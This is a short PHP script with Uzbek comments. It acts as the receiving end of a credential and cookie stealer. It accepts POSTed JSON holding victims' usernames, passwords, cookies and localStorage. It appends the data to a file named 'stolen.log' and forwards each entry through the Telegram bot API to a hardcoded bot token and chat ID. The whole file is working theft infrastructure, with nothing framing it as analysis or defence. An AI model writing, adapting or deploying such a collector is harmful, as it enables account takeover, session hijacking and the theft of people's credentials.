<?php
// ===== KONFIGURATSIYA =====
$botToken = '8756877821:AAHw6x7nHxu8382qVQDcYwY4hqyUivKTqi4';
$chatId = '7392334150';
$logFile = 'stolen.log';

// ===== ASOSIY SKRIPT =====
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die('Method not allowed');
}

$raw = file_get_contents('php://input');
$decoded = json_decode($raw, true);
if (!$decoded) {
    http_response_code(400);
    die('Invalid JSON');
}

// 1. Faylga yozish (zaxira)
$logEntry = date('Y-m-d H:i:s') . "\n" . print_r($decoded, true) . "\n---\n";
file_put_contents($logFile, $logEntry, FILE_APPEND);

// 2. Telegram xabar tayyorlash
$msg = "🔐 YANGI COOKIE!\n";
$msg .= "👤 Login: " . ($decoded['username'] ?? '—') . "\n";
$msg .= "🔑 Parol: " . ($decoded['password'] ?? '—') . "\n";
$msg .= "🍪 Cookie:\n" . ($decoded['cookies'] ?? 'Yo‘q') . "\n";
if (!empty($decoded['localStorage'])) {
    $msg .= "\n💾 localStorage:\n" . json_encode($decoded['localStorage'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}
$msg .= "\n🕒 " . date('Y-m-d H:i:s');

// 3. Telegramga yuborish (agar xatolik bo‘lsa, hech narsa qilmaydi)
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = ['chat_id' => $chatId, 'text' => $msg];
$options = [
    'http' => [
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($postData),
        'timeout' => 5
    ]
];
$ctx = stream_context_create($options);
@file_get_contents($url, false, $ctx); // @ xatolikni o‘chiradi

http_response_code(200);
echo 'OK';
?>